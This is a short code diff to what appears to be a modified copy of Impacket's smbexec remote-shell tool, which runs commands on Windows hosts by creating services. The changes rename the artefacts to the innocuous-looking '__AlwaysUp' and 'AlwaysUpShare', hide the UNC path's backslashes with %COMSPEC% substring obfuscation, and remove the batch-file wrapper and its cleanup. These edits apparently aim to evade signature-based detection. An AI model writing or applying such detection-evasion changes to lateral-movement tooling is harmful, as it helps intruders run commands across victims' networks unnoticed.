@@ -56,9 +56,9 @@ from impacket import version, smbserver
 from impacket.dcerpc.v5 import transport, scmr
 from impacket.krb5.keytab import Keytab
 
-OUTPUT_FILENAME = '__ren'
-SMBSERVER_DIR   = '__ens'
-DUMMY_SHARE     = 'VDL'
+OUTPUT_FILENAME = '__AlwaysUp'
+SMBSERVER_DIR   = '__AlwaysUp2'
+DUMMY_SHARE     = 'AlwaysUpShare'
 CODEC = sys.stdout.encoding
 
 class SMBServer(Thread):
@@ -177,7 +177,7 @@ class RemoteShell(cmd.Cmd):
         cmd.Cmd.__init__(self)
         self.__share = share
         self.__mode = mode
-        self.__output = '\\\\%COMPUTERNAME%\\' + self.__share + '\\' + OUTPUT_FILENAME
+        self.__output = '%COMSPEC:~19,1%%COMSPEC:~19,1%%COMPUTERNAME%\\' + self.__share + '\\' + OUTPUT_FILENAME
         self.__outputBuffer = b''
         self.__command = ''
         # Might also use wt.exe (wt.exe cmd /c c:\windows\system32\calc.exe)
@@ -282,13 +282,13 @@ class RemoteShell(cmd.Cmd):
             data = self.__pwsh + b64encode(data.encode('utf-16le')).decode()
 
         batchFile = 'C:\\Users\\Public\\Downloads\\AlwaysUp2.bat'
-                
-        command = self.__shell + '"cmd /c echo ' + data + ' ^> ' + self.__output + ' 2^>^&1 > ' + batchFile + ' & ' + \
-                  self.__shell + batchFile
+        command = self.__shell + '"cmd /c ' + data + ' > ' + self.__output        
+        #command = self.__shell + '"cmd /c echo ' + data + ' ^> ' + self.__output + ' 2^>^&1 > ' + batchFile + ' & ' + \
+        #          self.__shell + batchFile
 
         if self.__mode == 'SERVER':
             command += ' & ' + self.__copyBack
-        command += ' & ' + 'del ' + batchFile
+        #command += ' & ' + 'del ' + batchFile
 
         logging.debug('Executing %s' % command)
         resp = scmr.hRCreateServiceW(self.__scmr, self.__scHandle, self.__serviceName, self.__serviceName,
